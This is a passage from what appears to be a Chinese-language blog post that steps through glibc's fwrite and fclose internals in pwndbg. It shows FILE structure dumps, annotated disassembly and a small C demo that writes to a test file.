class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72536956,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到确实设置好了<br>接着往下走</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce7c &lt;_IO_file_overflow+188&gt;    test   ecx, ecx                        0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8ce7e &lt;_IO_file_overflow+190&gt;  ✘ jg     _IO_file_overflow+45        &lt;_IO_file_overflow+45&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8ce84 &lt;_IO_file_overflow+196&gt;    test   eax, 0x202                      0xfbad2484 &amp; 0x202     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce89 &lt;_IO_file_overflow+201&gt;  ✔ je     _IO_file_overflow+45        &lt;_IO_file_overflow+45&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8cded &lt;_IO_file_overflow+45&gt;     cmp    ebx, -1                         0xffffffff - -0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdf0 &lt;_IO_file_overflow+48&gt;   ✔ je     _IO_file_overflow+220       &lt;_IO_file_overflow+220&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ce9c &lt;_IO_file_overflow+220&gt;    pop    rbx          RBX =&gt; 32</span><br><span class="line">0x7ffff7c8ce9d &lt;_IO_file_overflow+221&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c8cea0 &lt;_IO_file_overflow+224&gt;    sub    rdx, rsi     RDX =&gt; 0 (0x5555555594b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8cea3 &lt;_IO_file_overflow+227&gt;    pop    rbp          RBP =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8cea4 &lt;_IO_file_overflow+228&gt;    pop    r12          R12 =&gt; 0xd68</span><br><span class="line">0x7ffff7c8cea6 &lt;_IO_file_overflow+230&gt;    jmp    _IO_do_write                &lt;_IO_do_write&gt;</span><br></pre></td></tr></table></figure><p>先检查<code>ecx</code>也就是<code>_mode</code>是否大于0（是否被设置为了某种读写模式），这里我们<code>_mode</code>是-1，所以不跳转，然后再判断<code>_flags</code>的状态（<code>0x200</code> &#x3D; <code>_IO_NO_WRITES</code>，<code>0x2</code> &#x3D; <code>_IO_CURRENTLY_PUTTING</code>，je判断，意味着当前不是正在输出，也没禁止写入），跳转到<code>&lt;_IO_file_overflow+45&gt;</code>，判断确定可以写入之后，调用<code>_IO_do_write</code>函数来系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，输出完后刷新缓冲区指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;             endbr64</span><br><span class="line">0x7ffff7c8c934 &lt;_IO_do_write+4&gt;           xor    eax, eax     EAX =&gt; 0</span><br><span class="line">0x7ffff7c8c936 &lt;_IO_do_write+6&gt;           test   rdx, rdx     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c939 &lt;_IO_do_write+9&gt;         ✘ jne    _IO_do_write+16             &lt;_IO_do_write+16&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8c93b &lt;_IO_do_write+11&gt;          ret                                &lt;_IO_file_xsputn+213&gt;</span><br></pre></td></tr></table></figure><p>我们此时<code>_IO_write_ptr</code> &#x3D;&#x3D; <code>_IO_write_base</code>，不需要输出，缓冲区也不需要刷新，故而<code>_IO_do_write</code>提前返回，再接着往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6de &lt;_IO_file_xsputn+222&gt;    mov    rcx, qword ptr [rbp + 0x40]     RCX, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8b6e2 &lt;_IO_file_xsputn+226&gt;    sub    rcx, qword ptr [rbp + 0x38]     RCX =&gt; 0x1000 (0x55555555a4b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8b6e6 &lt;_IO_file_xsputn+230&gt;    mov    r8, r15                         R8 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6e9 &lt;_IO_file_xsputn+233&gt;    cmp    rcx, 0x7f                       0x1000 - 0x7f     EFLAGS =&gt; 0x216 [ cf PF AF zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6ed &lt;_IO_file_xsputn+237&gt;  ✘ jbe    _IO_file_xsputn+250         &lt;_IO_file_xsputn+250&gt;</span><br></pre></td></tr></table></figure><p>然后计算<code>_IO_buf_end</code> - <code>_IO_buf_base</code>，其大于0x7f，继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6ef &lt;_IO_file_xsputn+239&gt;    mov    rax, r15      RAX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6f2 &lt;_IO_file_xsputn+242&gt;    xor    edx, edx      EDX =&gt; 0</span><br><span class="line">0x7ffff7c8b6f4 &lt;_IO_file_xsputn+244&gt;    div    rcx</span><br><span class="line">0x7ffff7c8b6f7 &lt;_IO_file_xsputn+247&gt;:   sub    r8,rdx</span><br><span class="line">0x7ffff7c8b6fa &lt;_IO_file_xsputn+250&gt;    test   r8, r8     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6fd &lt;_IO_file_xsputn+253&gt;  ✘ jne    _IO_file_xsputn+336         &lt;_IO_file_xsputn+336&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b6ff &lt;_IO_file_xsputn+255&gt;    mov    r12, rbx     R12 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b702 &lt;_IO_file_xsputn+258&gt;    test   r15, r15     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b705 &lt;_IO_file_xsputn+261&gt;  ✘ je     _IO_file_xsputn+110         &lt;_IO_file_xsputn+110&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b70b &lt;_IO_file_xsputn+267&gt;    lea    rsi, [r13 + r8]     RSI =&gt; 0x555555559480 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8b710 &lt;_IO_file_xsputn+272&gt;    mov    rdx, r15            RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b713 &lt;_IO_file_xsputn+275&gt;    mov    rdi, rbp            RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c8b716 &lt;_IO_file_xsputn+278&gt;    call   _IO_default_xsputn          &lt;_IO_default_xsputn&gt;</span><br></pre></td></tr></table></figure><p>这里<code>div rcx</code>，也就是将0x20除以0x1000的余数0x20存储到了<code>rdx</code>，经过一系列判断后调用<code>_IO_default_xsputn</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ddc4 &lt;_IO_default_xsputn+4&gt;     test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ddc7 &lt;_IO_default_xsputn+7&gt;   ✘ je     _IO_default_xsputn+480      &lt;_IO_default_xsputn+480&gt;</span><br></pre></td></tr></table></figure><p>仍然是检查写入量不为0，后续一些列判断后调用了<code>__mempcpy_avx_unaligned_erms</code>函数（mempcpy函数的优化实现）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7da0780 &lt;__mempcpy_avx_unaligned_erms&gt;       endbr64</span><br></pre></td></tr></table></figure><p>将数据写入缓冲区中<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72536956,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594d0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_write_ptr</code>正好是移动了0x20，再看缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5555555594a0</span><br><span class="line">0x5555555594a0: 0x0000000000000000      0x0000000000001011</span><br><span class="line">0x5555555594b0: 0x7777777777777777      0x7777777777777777</span><br><span class="line">0x5555555594c0: 0x7777777777777777      0x7777777777777777</span><br><span class="line">0x5555555594d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到数据已经读入<br>程序结束后，我们打开测试文件看到数据已经写入到了文件中<br>笔者就产生了疑惑：这里并没有系统调用write函数，数据只是进入了缓冲区，是如何写入文件的呢？不急，在本博客0x06部分再分析。<br>我们先总结一下fwrite的流程：<br><strong>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝到输出缓冲区，如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用<code>_IO_OVERFLOW</code>建立输出缓冲区或刷新输出缓冲区。输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size（0x1000），如果超过块的size，则不通过输出缓冲区直接以块为单位，使用sys_write输出大块的目标数据到目标文件。余下或者小于块size的数据（我们这里0x20的数据便是这一行列）则调用<code>_IO_default_xsputn</code>将数据拷贝到输出缓冲区</strong>。<br></p><h2 id="0x05-fclose函数"><a href="#0x05-fclose函数" class="headerlink" title="0x05 fclose函数"></a>0x05 fclose函数</h2><p>还是这个demo，加个fclose函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    fwrite(ptr, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fclose下个断点，开始调试<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_fclose:</span><br><span class="line">Address range 0x7ffff7c7ec70 to 0x7ffff7c7ee46:</span><br><span class="line">=&gt; 0x00007ffff7c7ec70 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7ec74 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c7ec76 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c7ec77 &lt;+7&gt;:     mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c7ec7a &lt;+10&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7ec7b &lt;+11&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c7ec7d &lt;+13&gt;:    test   ah,0x20</span><br><span class="line">   0x00007ffff7c7ec80 &lt;+16&gt;:    jne    0x7ffff7c7ed30 &lt;_IO_new_fclose+192&gt;</span><br><span class="line">   0x00007ffff7c7ec86 &lt;+22&gt;:    mov    edx,eax</span><br><span class="line">   0x00007ffff7c7ec88 &lt;+24&gt;:    and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ec8e &lt;+30&gt;:    je     0x7ffff7c7ed3d &lt;_IO_new_fclose+205&gt;</span><br><span class="line">   0x00007ffff7c7ec94 &lt;+36&gt;:    shl    eax,0x1a</span><br><span class="line">   0x00007ffff7c7ec97 &lt;+39&gt;:    sar    eax,0x1f</span><br><span class="line">   0x00007ffff7c7ec9a &lt;+42&gt;:    mov    r12d,eax</span><br><span class="line">   0x00007ffff7c7ec9d &lt;+45&gt;:    test   edx,edx</span><br><span class="line">   0x00007ffff7c7ec9f &lt;+47&gt;:    jne    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7eca1 &lt;+49&gt;:    mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7eca8 &lt;+56&gt;:    sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ecac &lt;+60&gt;:    je     0x7ffff7c7eda0 &lt;_IO_new_fclose+304&gt;</span><br><span class="line">   0x00007ffff7c7ecb2 &lt;+66&gt;:    mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c7ecb9 &lt;+73&gt;:    lea    rdx,[rip+0x197d40]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c7ecc0 &lt;+80&gt;:    lea    rax,[rip+0x198aa1]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c7ecc7 &lt;+87&gt;:    sub    rax,rdx</span><br><span class="line">   0x00007ffff7c7ecca &lt;+90&gt;:    mov    rcx,rbx</span><br><span class="line">   0x00007ffff7c7eccd &lt;+93&gt;:    sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c7ecd0 &lt;+96&gt;:    cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c7ecd3 &lt;+99&gt;:    jbe    0x7ffff7c7ee10 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">   0x00007ffff7c7ecd9 &lt;+105&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c7ecdb &lt;+107&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ecde &lt;+110&gt;:   call   QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c7ece1 &lt;+113&gt;:   mov    eax,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c7ece7 &lt;+119&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c7ece9 &lt;+121&gt;:   jg     0x7ffff7c7edc0 &lt;_IO_new_fclose+336&gt;</span><br><span class="line">   0x00007ffff7c7ecef &lt;+127&gt;:   cmp    QWORD PTR [rbp+0x48],0x0</span><br><span class="line">   0x00007ffff7c7ecf4 &lt;+132&gt;:   je     0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7ecf6 &lt;+134&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ecf9 &lt;+137&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br><span class="line">   0x00007ffff7c7ecfe &lt;+142&gt;:   cmp    rbp,QWORD PTR [rip+0x19b273]        # 0x7ffff7e19f78</span><br><span class="line">   0x00007ffff7c7ed05 &lt;+149&gt;:   sete   al</span><br><span class="line">   0x00007ffff7c7ed08 &lt;+152&gt;:   cmp    rbp,QWORD PTR [rip+0x19b1e1]        # 0x7ffff7e19ef0</span><br><span class="line">   0x00007ffff7c7ed0f &lt;+159&gt;:   sete   dl</span><br><span class="line">   0x00007ffff7c7ed12 &lt;+162&gt;:   or     al,dl</span><br><span class="line">   0x00007ffff7c7ed14 &lt;+164&gt;:   jne    0x7ffff7c7ed27 &lt;_IO_new_fclose+183&gt;</span><br><span class="line">   0x00007ffff7c7ed16 &lt;+166&gt;:   cmp    rbp,QWORD PTR [rip+0x19b16b]        # 0x7ffff7e19e88</span><br><span class="line">   0x00007ffff7c7ed1d &lt;+173&gt;:   je     0x7ffff7c7ed27 &lt;_IO_new_fclose+183&gt;</span><br><span class="line">   0x00007ffff7c7ed1f &lt;+175&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ed22 &lt;+178&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c7ed27 &lt;+183&gt;:   mov    eax,r12d</span><br><span class="line">   0x00007ffff7c7ed2a &lt;+186&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7ed2b &lt;+187&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7ed2c &lt;+188&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7ed2e &lt;+190&gt;:   ret</span><br><span class="line">   0x00007ffff7c7ed2f &lt;+191&gt;:   nop</span><br><span class="line">   0x00007ffff7c7ed30 &lt;+192&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c7ed35 &lt;+197&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed38 &lt;+200&gt;:   test   ah,0x80</span><br><span class="line">   0x00007ffff7c7ed3b &lt;+203&gt;:   jne    0x7ffff7c7ed76 &lt;_IO_new_fclose+262&gt;</span><br><span class="line">   0x00007ffff7c7ed3d &lt;+205&gt;:   mov    rbx,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7ed46 &lt;+214&gt;:   mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7ed4d &lt;+221&gt;:   cmp    QWORD PTR [rdi+0x8],rbx</span><br><span class="line">   0x00007ffff7c7ed51 &lt;+225&gt;:   je     0x7ffff7c7ed72 &lt;_IO_new_fclose+258&gt;</span><br><span class="line">   0x00007ffff7c7ed53 &lt;+227&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7ed55 &lt;+229&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7ed5a &lt;+234&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7ed5e &lt;+238&gt;:   jne    0x7ffff7c7ee30 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0x00007ffff7c7ed64 &lt;+244&gt;:   mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c7ed6b &lt;+251&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed6e &lt;+254&gt;:   mov    QWORD PTR [rdi+0x8],rbx</span><br><span class="line">   0x00007ffff7c7ed72 &lt;+258&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ed76 &lt;+262&gt;:   mov    edx,eax</span><br><span class="line">   0x00007ffff7c7ed78 &lt;+264&gt;:   and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ed7e &lt;+270&gt;:   test   ah,0x20</span><br><span class="line">   0x00007ffff7c7ed81 &lt;+273&gt;:   je     0x7ffff7c7ec94 &lt;_IO_new_fclose+36&gt;</span><br><span class="line">   0x00007ffff7c7ed87 &lt;+279&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c7ed8a &lt;+282&gt;:   call   0x7ffff7c8be90 &lt;_IO_new_file_close_it&gt;</span><br><span class="line">   0x00007ffff7c7ed8f &lt;+287&gt;:   mov    edx,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c7ed92 &lt;+290&gt;:   mov    r12d,eax</span><br><span class="line">   0x00007ffff7c7ed95 &lt;+293&gt;:   and    edx,0x8000</span><br><span class="line">   0x00007ffff7c7ed9b 